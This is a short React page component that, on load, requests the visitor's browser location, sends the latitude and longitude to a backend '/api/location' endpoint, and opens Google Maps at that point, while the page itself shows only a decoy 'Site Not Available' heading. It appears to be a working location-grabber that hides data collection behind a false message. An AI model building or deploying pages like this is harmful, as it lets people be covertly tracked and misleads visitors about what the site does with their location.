import { useEffect } from "react";
import "./index.css";

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;

function App() {
  useEffect(() => {
    getInfo();
  }, []);

  const getInfo = async () => {
    try {
      if (!navigator.geolocation) {
        console.log("Geolocation not supported");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          await fetch(`${BACKEND_URL}/api/location`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              latitude: lat,
              longitude: lon,
            }),
          });

          const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

          window.open(mapUrl, "_blank");
        },
        (err) => {
          console.log(err.message);
        }
      );
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div className="container">
      <h1>Site Not Available</h1>
    </div>
  );
}

export default App;